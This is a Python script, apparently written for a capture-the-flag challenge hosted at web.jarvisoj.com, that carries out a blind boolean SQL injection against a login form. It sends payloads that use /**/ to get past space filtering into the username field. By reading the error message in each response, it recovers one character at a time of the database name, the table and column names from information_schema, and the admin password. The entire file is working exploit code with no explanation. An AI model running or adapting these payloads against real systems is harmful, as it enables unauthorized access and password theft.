import requests,string

allPrintableChars=string.digits + string.ascii_lowercase + string.ascii_uppercase + string.punctuation#构造字典

url='http://web.jarvisoj.com:32787/login.php'

def getDb():
    payload={
        'username':'',
        'password':1
    }
    result=''
    flag=1
    count=0
    while flag:
        flag=0
        count+=1
        for c in allPrintableChars:
            asc=ord(c)
            payload['username']="'or/**/ascii(substr(database(),%d,1))=%d#"%(count,asc)
            response=requests.post(url,data=payload)
            if "密码错误" in response.text:
                result+=c
                flag=1
                print("database:",result)
    return result

def getTb():
    payload={
        'username':'',
        'password':1
    }
    result=''
    flag=1
    count=0
    while flag:
        flag=0
        count+=1
        for c in allPrintableChars:
            asc=ord(c)
            payload['username']="'or/**/ascii(substr((select/**/group_concat(table_name)from/**/information_schema.tables/**/where/**/table_schema=database()),%d,1))=%d#"%(count,asc)
            response=requests.post(url,data=payload)
            if "密码错误" in response.text:
                result+=c
                flag=1
                print("table:",result)
    return result

def getCol():
    payload={
        'username':'',
        'password':1
    }
    result=''
    flag=1
    count=0
    while flag:
        flag=0
        count+=1
        for c in allPrintableChars:
            asc=ord(c)
            payload['username']="'or/**/ascii(substr((select/**/group_concat(column_name)from/**/information_schema.columns/**/where/**/table_schema=database()),%d,1))=%d#"%(count,asc)
            response=requests.post(url,data=payload)
            if "密码错误" in response.text:
                result+=c
                flag=1
                print("columns:",result)
    return result

def getPassword():
    payload={
        'username':'',
        'password':1
    }
    result=''
    flag=1
    count=0
    while flag:
        flag=0
        count+=1
        for c in allPrintableChars:
            asc=ord(c)
            payload['username']="'or/**/ascii(substr((select/**/password/**/from/**/admin),%d,1))=%d#"%(count,asc)
            response=requests.post(url,data=payload)
            if "密码错误" in response.text:
                result+=c
                flag=1
                print("password:",result)
    return result
    
if __name__ == '__main__':
    print("Database:%s\nTable:%s\nColums:%s\nPassword:%s\n"%(getDb(),getTb(),getCol(),getPassword()))